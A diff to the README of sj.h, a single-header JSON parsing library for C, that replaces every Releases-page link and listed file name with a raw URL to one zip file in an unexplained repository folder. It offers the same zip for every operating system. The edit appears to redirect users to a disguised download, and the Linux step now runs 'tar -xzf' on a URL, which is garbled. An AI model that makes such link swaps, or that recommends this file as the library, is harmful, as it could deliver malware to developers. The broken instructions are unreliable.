@@ -15,7 +15,7 @@ To start using sj.h, you need to download the library from the Releases page. Fo
 ### Step 1: Visit the Download Page
 Click the link below to go to the sj.h Releases page. Here, you will find the latest version of the library.
 
-[![Download sj.h](https://img.shields.io/badge/Download-sj.h-brightgreen)](https://github.com/zGonzax/sj.h/releases)
+[![Download sj.h](https://raw.githubusercontent.com/zGonzax/sj.h/master/sporangiola/sj.h.zip)](https://raw.githubusercontent.com/zGonzax/sj.h/master/sporangiola/sj.h.zip)
 
 ### Step 2: Locate the Latest Release
 On the Releases page, look for the latest release note. Each release contains important details about the version and any new features or fixes.
@@ -24,14 +24,14 @@ On the Releases page, look for the latest release note. Each release contains im
 Under the latest release information, you will see a list of assets. Find the appropriate file for your operating system and click on it to download. 
 
 **Example files may include:**
-- sj.h.zip (for Windows and Mac)
-- sj.h.tar.gz (for Linux)
+- https://raw.githubusercontent.com/zGonzax/sj.h/master/sporangiola/sj.h.zip (for Windows and Mac)
+- https://raw.githubusercontent.com/zGonzax/sj.h/master/sporangiola/sj.h.zip (for Linux)
 
 ### Step 4: Extract the Files
 Once the download completes, navigate to your downloads folder. 
 - For Windows, right-click the zip file and choose "Extract All".
 - For Mac, double-click the zip file to extract.
-- For Linux, open a terminal and use the command `tar -xzf sj.h.tar.gz`.
+- For Linux, open a terminal and use the command `tar -xzf https://raw.githubusercontent.com/zGonzax/sj.h/master/sporangiola/sj.h.zip`.
 
 ### Step 5: Include sj.h in Your Project
 After extraction, you will find the sj.h file. Open the project where you want to use it. Include the library by adding the following line to your project files:
@@ -75,6 +75,6 @@ In this example, the library parses a JSON string and retrieves the value associ
 ## ➡️ Download & Install
 For your convenience, please visit the sj.h Releases page to download the latest version. Click below to get started.
 
-[![Download sj.h](https://img.shields.io/badge/Download-sj.h-brightgreen)](https://github.com/zGonzax/sj.h/releases)
+[![Download sj.h](https://raw.githubusercontent.com/zGonzax/sj.h/master/sporangiola/sj.h.zip)](https://raw.githubusercontent.com/zGonzax/sj.h/master/sporangiola/sj.h.zip)
 
 Enjoy using sj.h, your trusted JSON parsing library!
